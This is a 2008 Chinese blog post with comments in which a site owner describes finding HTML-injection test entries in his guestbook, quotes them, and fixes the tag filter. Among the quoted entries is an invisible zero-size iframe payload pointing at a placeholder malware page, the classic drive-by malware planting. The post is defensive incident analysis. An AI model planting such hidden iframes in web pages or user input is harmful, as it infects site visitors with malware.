title: 留言簿被别人测试挂马
id: 241
categories:
  - 编程相关
date: 2008-01-29 16:33:09
tags:
---

先戴个图给大家看看：
![iframe.JPG](https://asset-1258390188.cos.ap-shanghai.myqcloud.com/iframe.JPG)](https://asset-1258390188.cos.ap-shanghai.myqcloud.com01/iframe.JPG "iframe.JPG")

一看就知道是被别人测试iframe挂马了，看来留言簿的代码还是有问题，没有把该过滤的东西过滤掉。putty到DH主机上看看MYSQL数据库里面的东西：

最早有问题的留言是：

&nbsp;&lt;tr&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;th&nbsp;scope=&quot;col&quot;&gt;&amp;nbsp;&lt;/th&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;th&nbsp;scope=&quot;col&quot;&gt;&amp;nbsp;&lt;/th&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;th&nbsp;scope=&quot;col&quot;&gt;&amp;nbsp;&lt;/th&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;th&nbsp;scope=&quot;col&quot;&gt;&amp;nbsp;&lt;/th&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;th&nbsp;scope=&quot;col&quot;&gt;&amp;nbsp;&lt;/th&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;th&nbsp;scope=&quot;col&quot;&gt;&amp;nbsp;&lt;/th&gt;
&nbsp;&nbsp;&lt;/tr&gt;
&nbsp;&nbsp;&lt;tr&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;td&gt;&amp;nbsp;&lt;/td&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;td&gt;&amp;nbsp;&lt;/td&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;td&gt;&amp;nbsp;&lt;/td&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;td&gt;&amp;nbsp;&lt;/td&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;td&gt;&amp;nbsp;&lt;/td&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;td&gt;&amp;nbsp;&lt;/td&gt;
&nbsp;&nbsp;&lt;/tr&gt;
&nbsp;&nbsp;&lt;tr&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;td&gt;&amp;nbsp;&lt;/td&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;td&gt;&amp;nbsp;&lt;/td&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;td&gt;&amp;nbsp;&lt;/td&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;td&gt;&amp;nbsp;&lt;/td&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;td&gt;&amp;nbsp;&lt;/td&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;td&gt;&amp;nbsp;&lt;/td&gt;
&nbsp;&nbsp;&lt;/tr&gt;
&nbsp;&nbsp;&lt;tr&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;td&gt;&amp;nbsp;&lt;/td&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;td&gt;&amp;nbsp;&lt;/td&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;td&gt;&amp;nbsp;&lt;/td&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;td&gt;&amp;nbsp;&lt;/td&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;td&gt;&amp;nbsp;&lt;/td&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;td&gt;&amp;nbsp;&lt;/td&gt;
&nbsp;&nbsp;&lt;/tr&gt;

这个应该是测试是否可以提交HTML标签的。接下来的留言内容：

&nbsp;&lt;iframe&nbsp;src=http://www.xxx.com/muma.html&nbsp;width=0&nbsp;height=0&gt;&lt;/iframe&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;

这段代码是被写入留言簿中的留言内容，产生一个高、宽为0的frame，经典的挂马行为。这个frame在opera下可以看到，很小的一块，但是IE里是看不到的，当然也只有IE才会中iframe的马。看看在Opera中的效果：
![d.jpg](https://asset-1258390188.cos.ap-shanghai.myqcloud.com/d.jpg)](https://asset-1258390188.cos.ap-shanghai.myqcloud.com01/d.jpg "d.jpg")

再看下面：

&lt;iframe&nbsp;src=http://www.google.com&nbsp;width=100&nbsp;height=100&gt;&lt;/iframe&gt;&nbsp;

产生一个高、宽为100的frame，里面是google主页。

&nbsp;&lt;iframe&nbsp;src=http://www.google.com&nbsp;&gt;&lt;/iframe&gt;&nbsp;&nbsp;&nbsp;

最后一个，未指定高、宽由页面自动匹配。

知道问题的原因了，看了看留言簿的代码，在关键字过滤处没有&lt;tr&gt;&nbsp;&lt;iframe&gt;这两个标签，现在加上去就好了。然后在MYSQL中删除这几条垃圾留言。OK

这个年头自己弄个网站不知道一天有多少人在打你的主意，你要是有点流量的话更是会被别人定上的，网上混的话还是安全第一。
## Comments

**[Amankwah](#2893 "2008-01-29 18:54:52"):** Opera好！这都发现了，不知道Firefox能看到不？

**[wind](#2894 "2008-01-29 19:03:55"):** 虾米叫挂马？

**[cocobear](#2895 "2008-01-30 13:39:42"):** TO:wind google 挂马 firefox不知道了，贴出来的图片没有边框，看不清楚，郁闷；

**[草儿](#2896 "2008-01-30 14:03:36"):** 汗…… 不知道GOOGLE有没有提示你“该网站含有恶意代码”，哈哈~

**[luguo](#2897 "2008-01-30 17:09:57"):** 很黄很暴力～～

**[cocobear](#2898 "2008-01-30 19:08:52"):** 没那么夸张，只是别人测试，你看那个地址也是不存在的 http://www.xxx.com/muma.html

**[cocobear](#2917 "2008-02-13 20:53:33"):** a b strong 等 :-)

**[cnenc](#2908 "2008-02-07 05:29:00"):** 以前就提示你,可惜你一直不当回事.

**[kongove](#2911 "2008-02-09 16:05:14"):** 能透露一下，还有那些关键标签没过滤呢？？

**[crazyfranc](#2902 "2008-02-01 20:57:58"):** 你可真细心啊。看来以后还是换OPERA好了。

